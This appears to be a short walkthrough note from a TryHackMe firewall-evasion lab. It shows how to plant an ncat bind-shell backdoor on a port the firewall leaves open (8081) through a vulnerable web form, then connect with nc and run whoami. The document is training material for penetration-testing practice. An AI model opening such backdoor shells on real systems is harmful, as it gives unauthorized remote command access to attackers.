# Evasion using non-standard ports

To create a backdoor via the specified port number that lets you interact with the Bash shell:

    ncat -lvnp PORT_NUMBER -e /bin/bash

Considering the case that we have a firewall, it is not enough to use ncat to create a backdoor unless we can 
connect to the listening port number. And unless we run ncat as a privileged user, root, or using sudo, we cannot 
use port numbers below 1024.

## Lab

Use the vulnerable web-form to set up an `ncat` listener. Knowing that the firewall does not block packets to 
destination port `8081`, use ncat to listen for incoming connections and execute Bash shell. Connect to the shell from 
the attack machine. What is the username associated with which you are logged in?

On Target (`http://TARGET_IP:8080`), run an ncat listener:

    ncat -lvnp 8081 -e /bin/bash

Then on the attacker machine connected to THM VPN, connect through `nc`:

    nc TARGET_IP 8081

Ask `whoami`.

